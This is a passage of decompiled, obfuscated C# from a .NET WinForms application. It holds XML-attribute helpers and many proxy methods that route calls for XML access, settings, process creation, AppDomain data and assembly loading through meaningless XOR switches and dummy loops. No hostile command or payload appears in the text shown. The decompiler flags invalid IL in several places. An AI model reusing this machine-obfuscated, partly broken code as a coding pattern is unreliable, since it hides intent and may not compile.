			while ((short_0 * short_0 + short_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static XAttribute smethod_9<T, U>(T gparam_0, U gparam_1, char char_0, int int_0) where T : XElement where U : XName
		{
			int num = 0;
			XAttribute result;
			int num2;
			do
			{
				result = (XAttribute)((((char_0 ^ int_0) - 46) ^ num) switch
				{
					0 => Class10.Class11.smethod_19<XName, XElement>((XElement)(object)gparam_0, (XName)(object)gparam_1, (short)753, (short)751), 
					_ => null, 
				});
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_10<T>(T gparam_0, int int_0, int int_1) where T : XAttribute
		{
			int num = 0;
			string result = (((int_0 ^ int_1) - 11) ^ 0) switch
			{
				0 => (string)(IEnumerable)Class12.Class16.smethod_8<XAttribute>((XAttribute)(object)gparam_0, 'ϗ', 'ϛ'), 
				_ => null, 
			};
			num++;
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_11<T>(T gparam_0, short short_0, short short_1) where T : XNamespace
		{
			int num = 0;
			string result;
			do
			{
				result = (((short_0 ^ short_1) - 91) ^ num) switch
				{
					0 => (string)(ICloneable)Class10.smethod_8<XNamespace>((XNamespace)(object)gparam_0, 'Β', 'Ϯ'), 
					_ => null, 
				};
				num++;
			}
			while ((short_1 * short_1 + short_1) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static string smethod_12<T>(T gparam_0, char char_0, short short_0) where T : XName
		{
			int num = 0;
			string result;
			do
			{
				result = (((short_0 ^ char_0) - 95) ^ num) switch
				{
					0 => (string)(IComparable)Class12.Class13.smethod_7<XName>((XName)(object)gparam_0, (short)466, (short)509), 
					_ => null, 
				};
				num++;
			}
			while ((char_0 * char_0 + char_0) % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static bool smethod_13<T, U>(U gparam_0, T gparam_1, char char_0, char char_1) where T : XNamespace where U : XNamespace
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((char_1 ^ char_0) - 28) ^ num) switch
				{
					0 => Class12.Class13.smethod_8<XNamespace, XNamespace>((XNamespace)(object)gparam_0, (XNamespace)(object)gparam_1, 'v', (short)1), 
					_ => false, 
				};
				num++;
				num2 = char_1 * char_1;
				num2 = char_1 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static bool smethod_14<T, U>(T gparam_0, U gparam_1, int int_0, char char_0) where T : Hashtable
		{
			int num = 0;
			bool result;
			int num2;
			do
			{
				result = (((char_0 ^ int_0) - 115) ^ num) switch
				{
					0 => Class10.Class11.smethod_20((Hashtable)gparam_0, (object)gparam_1, 453, 'ǰ'), 
					_ => true, 
				};
				num++;
				num2 = char_0 * char_0;
				num2 = char_0 + num2;
			}
			while (num2 % 2 != 0);
			return result;
		}

		[SecuritySafeCritical]
		internal static Exception smethod_15<T>(T gparam_0, int int_0, int int_1) where T : Exception
		{
			int num = 0;
			Exception result = (((int_0 ^ int_1) - 115) ^ 0) switch
			{
				0 => Class12.Class16.smethod_0((Exception)gparam_0, (short)199, '\u0081'), 
				_ => null, 
			};
			num++;
			return result;
		}
	}

	public static string this[IEnumerable<XElement> ienumerable_0]
	{
		get
		{
			using (IEnumerator<XElement> enumerator = ienumerable_0.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					XElement gparam_ = (XElement)(IXmlSerializable)enumerator.Current;
					return (string)(IComparable)Class5.Class6.smethod_5<XElement>(gparam_, '²', 'à');
				}
			}
			return null;
		}
		set
		{
			using IEnumerator<XElement> enumerator = ienumerable_0.GetEnumerator();
			if (enumerator.MoveNext())
			{
				XElement gparam_ = (XElement)(IXmlSerializable)enumerator.Current;
				Class5.smethod_8<XElement, string>(gparam_, value, 'ȹ', 'Ș');
			}
		}
	}

	public static string this[IEnumerable<XElement> ienumerable_0, XName xname_0]
	{
		get
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Expected O, but got Unknown
			using (IEnumerator<XElement> enumerator = ienumerable_0.GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					XElement gparam_ = (XElement)(XNode)enumerator.Current;
					return Class7.smethod_10<XAttribute>(Class7.smethod_9<XElement, XName>(gparam_, xname_0, 'Ʈ', 384), 892, 887);
				}
			}
			return null;
		}
		set
		{
			//IL_001b: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			using IEnumerator<XElement> enumerator = ienumerable_0.GetEnumerator();
			if (enumerator.MoveNext())
			{
				XElement gparam_ = (XElement)(XContainer)enumerator.Current;
				Class9.smethod_7<XElement, XName, object>(gparam_, xname_0, (object)value, 391, 440);
			}
		}
	}

	public static string this[XElement xelement_0, XName xname_0]
	{
		get
		{
			return (string)(IComparable<string>)Class7.smethod_10<XAttribute>(Class7.smethod_9<XElement, XName>(xelement_0, xname_0, 'ȓ', 573), 118, 125);
		}
		set
		{
			Class9.smethod_7<XElement, XName, object>(xelement_0, xname_0, (object)value, 233, 214);
		}
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	private Class3()
	{
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	public static XAttribute smethod_0(XName xname_0, object object_0)
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		if (object_0 == null)
		{
			return null;
		}
		return new XAttribute(xname_0, Class5.smethod_3(object_0, 891, 809));
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	public static XAttribute smethod_1(XName xname_0, XNamespace xnamespace_0)
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_0017: Expected O, but got Unknown
		XAttribute val = new XAttribute(xname_0, (object)Class7.smethod_11<XNamespace>(xnamespace_0, (short)532, (short)591));
		Class3.smethod_14<XObject, object>((XObject)(object)val, (object)xnamespace_0, 'Ű', (short)257);
		return val;
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	public static object smethod_2(string[] string_0, XNamespace[] xnamespace_0, List<XAttribute> list_0, object object_0)
	{
		if (object_0 != null)
		{
			XElement val = (XElement)((object_0 is XElement) ? object_0 : null);
			if (val != null)
			{
				return smethod_4(string_0, xnamespace_0, list_0, val);
			}
			if (object_0 is IEnumerable ienumerable_)
			{
				return smethod_3(string_0, xnamespace_0, list_0, ienumerable_);
			}
		}
		return object_0;
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	public static IEnumerable smethod_3(string[] string_0, XNamespace[] xnamespace_0, List<XAttribute> list_0, IEnumerable ienumerable_0)
	{
		if (ienumerable_0 != null)
		{
			if (ienumerable_0 is IEnumerable<XElement> source)
			{
				return source.Select(new Class4(string_0, xnamespace_0, list_0).method_0);
			}
			return ienumerable_0.Cast<object>().Select(new Class4(string_0, xnamespace_0, list_0).method_1);
		}
		return ienumerable_0;
	}

	[EditorBrowsable(EditorBrowsableState.Never)]
	public static XElement smethod_4(string[] string_0, XNamespace[] xnamespace_0, List<XAttribute> list_0, XElement xelement_0)
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005a: Expected O, but got Unknown
		//IL_0128: Unknown result type (might be due to invalid IL or missing references)
		//IL_012f: Expected O, but got Unknown
		//IL_0158: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Expected O, but got Unknown
		checked
		{
			if (xelement_0 != null)
			{
				XAttribute val = (XAttribute)(XObject)Class5.smethod_9<XElement>(xelement_0, 736, (short)738);
				while (val != null)
				{
					XAttribute val2 = Class5.smethod_10<XAttribute>(val, (short)411, 'Ƶ');
					if (Class5.smethod_11<XAttribute>(val, (short)464, 497))
					{
						XNamespace val3 = ((XObject)val).Annotation<XNamespace>();
						string gparam_ = (string)(IConvertible)Class7.smethod_12<XName>(Class3.smethod_15<XAttribute>(val, (short)272, (short)374), 'Ϫ', (short)949);
						if (val3 != null)
						{
							if ((string_0 != null && xnamespace_0 != null) ? true : false)
							{
								int num = string_0.Length - 1;
								int num2 = num;
								int num3 = 0;
								while (true)
								{
									int num4 = num3;
									int num5 = num2;
									if (num4 > num5)
									{
										break;
									}
									string gparam_2 = string_0[num3];
									XNamespace gparam_3 = xnamespace_0[num3];
									if (!Class5.Class6.smethod_6(gparam_, gparam_2, 911, 919))
									{
										num3++;
										continue;
									}
									if (Class7.smethod_13<XNamespace, XNamespace>(val3, gparam_3, ']', 'A'))
									{
										Class5.smethod_12<XAttribute>(val, 670, 717);
									}
									val = null;
									break;
								}
							}
							if (val != null)
							{
								if (list_0 != null)
								{
									int num6 = list_0.Count - 1;
									int num7 = num6;
									int num8 = 0;
									while (true)
									{
										int num9 = num8;
										int num5 = num7;
										if (num9 > num5)
										{
											break;
										}
										XAttribute val4 = list_0[num8];
										string gparam_4 = Class7.smethod_12<XName>(Class3.smethod_15<XAttribute>(val4, (short)587, (short)557), 'Ƙ', (short)455);
										XNamespace val5 = ((XObject)val4).Annotation<XNamespace>();
										if (val5 == null || !Class5.Class6.smethod_6(gparam_, gparam_4, 217, 193))
										{
											num8++;
											continue;
										}
										if (Class7.smethod_13<XNamespace, XNamespace>(val3, val5, 'ċ', 'ė'))
										{
											Class5.smethod_12<XAttribute>(val, 888, 811);
										}
										val = null;
										break;
									}
								}
								if (val != null)
								{
									Class12.Class13.smethod_6<XAttribute>(val, '\u0018', (short)108);
									list_0.Add(val);
								}
							}
						}
					}
					val = val2;
				}
			}
			return (XElement)(IXmlSerializable)xelement_0;
		}
	}

	[SecuritySafeCritical]
	static Class3()
	{
		Class5.smethod_2();
	}

	[SecuritySafeCritical]
	internal static SettingsBase smethod_5<T>(T gparam_0, short short_0, char char_0) where T : SettingsBase
	{
		int num = 0;
		SettingsBase result;
		do
		{
			result = (SettingsBase)((((short_0 ^ char_0) - 48) ^ num) switch
			{
				0 => Class10.Class11.smethod_21<SettingsBase>((SettingsBase)(object)gparam_0, 'Ž', 363), 
				_ => null, 
			});
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_6<T>(T gparam_0, ref bool bool_0, int int_0, char char_0)
	{
		int num = 0;
		switch (((int_0 ^ char_0) - 27) ^ 0)
		{
		case 0:
			Class10.smethod_9((object)gparam_0, ref bool_0, 582, (short)590);
			break;
		}
		num++;
	}

	[SecuritySafeCritical]
	internal static Assembly smethod_7<T>(T gparam_0, int int_0, char char_0) where T : Type
	{
		int num = 0;
		Assembly result;
		do
		{
			result = (((char_0 ^ int_0) - 69) ^ num) switch
			{
				0 => (Assembly)(ISerializable)Class12.Class16.smethod_9((Type)gparam_0, 'Ƀ', (short)544), 
				_ => null, 
			};
			num++;
		}
		while ((char_0 * char_0 + char_0) % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static object smethod_8<T, U, V>(T gparam_0, V gparam_1, U gparam_2, int int_0, short short_0) where T : ResourceManager where U : CultureInfo where V : string
	{
		int num = 0;
		object result = (((short_0 ^ int_0) - 18) ^ 0) switch
		{
			0 => Class12.Class13.smethod_9((ResourceManager)gparam_0, (string)gparam_1, (CultureInfo)gparam_2, 'ʜ', (short)744), 
			_ => null, 
		};
		num++;
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_9<T, U>(U gparam_0, T gparam_1, char char_0, char char_1) where T : EventHandler where U : Form
	{
		int num = 0;
		switch (((char_1 ^ char_0) - 101) ^ 0)
		{
		case 0:
			Class10.Class11.smethod_22<EventHandler, Form>((Form)(object)gparam_0, (EventHandler)gparam_1, 243, 253);
			break;
		}
		num++;
	}

	[SecuritySafeCritical]
	internal static void smethod_10<T>(T gparam_0, AutoScaleMode autoScaleMode_0, short short_0, short short_1) where T : ContainerControl
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		int num = 0;
		switch (((short_0 ^ short_1) - 65) ^ 0)
		{
		case 0:
			Class10.smethod_10<ContainerControl>((ContainerControl)(object)gparam_0, autoScaleMode_0, (short)723, 761);
			break;
		}
		num++;
	}

	[SecuritySafeCritical]
	internal static Process smethod_11<T>(T gparam_0, int int_0, short short_0) where T : string
	{
		int num = 0;
		Process result;
		int num2;
		do
		{
			result = (((short_0 ^ int_0) - 82) ^ num) switch
			{
				0 => (Process)(IComponent)Class10.smethod_11((string)gparam_0, (short)384, 399), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_12<T, U, V>(T gparam_0, U gparam_1, V gparam_2, char char_0, char char_1) where T : AppDomain where U : string
	{
		int num = 0;
		switch (((char_0 ^ char_1) - 117) ^ 0)
		{
		case 0:
			Class10.smethod_12((AppDomain)gparam_0, (string)gparam_1, (object)gparam_2, '\u035b', '\u0361');
			break;
		}
		num++;
	}

	[SecuritySafeCritical]
	internal static string[] smethod_13<T>(T gparam_0, short short_0, int int_0) where T : Assembly
	{
		int num = 0;
		string[] result;
		int num2;
		do
		{
			result = (((int_0 ^ short_0) - 15) ^ num) switch
			{
				0 => Class10.Class11.smethod_23((Assembly)gparam_0, (short)55, 'C'), 
				_ => null, 
			};
			num++;
			num2 = short_0 * short_0;
			num2 = short_0 + num2;
		}
		while (num2 % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_14<T, U>(T gparam_0, U gparam_1, char char_0, short short_0) where T : XObject
	{
		int num = 0;
		do
		{
			switch (((char_0 ^ short_0) - 113) ^ num)
			{
			case 0:
				Class10.Class11.smethod_24<object, XObject>((XObject)(object)gparam_0, (object)gparam_1, (short)841, (short)840);
				break;
			}
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
	}

	[SecuritySafeCritical]
	internal static XName smethod_15<T>(T gparam_0, short short_0, short short_1) where T : XAttribute
	{
		int num = 0;
		XName result;
		do
		{
			result = (XName)((((short_1 ^ short_0) - 102) ^ num) switch
			{
				0 => Class10.Class11.smethod_25<XAttribute>((XAttribute)(object)gparam_0, 'Ͼ', 'Ϟ'), 
				_ => null, 
			});
			num++;
		}
		while ((short_0 * short_0 + short_0) % 2 != 0);
		return result;
	}

	[SecuritySafeCritical]
	internal static string smethod_16<T>(T gparam_0, int int_0, int int_1) where T : Exception
	{
		int num = 0;
		string result = (((int_0 ^ int_1) - 35) ^ 0) switch
		{
			0 => (string)(ICloneable)Class12.smethod_6((Exception)gparam_0, 794, 893), 
			_ => null, 
		};
		num++;
		return result;
	}

	[SecuritySafeCritical]
	internal static void smethod_17<T>(T gparam_0, string[] string_0, short short_0, int int_0) where T : WindowsFormsApplicationBase
	{
		int num = 0;
		switch (((short_0 ^ int_0) - 66) ^ 0)
		{
		case 0:
			Class10.Class11.smethod_26<WindowsFormsApplicationBase>((WindowsFormsApplicationBase)(object)gparam_0, string_0, (short)517, 567);
			break;
		}
		num++;
	}
}
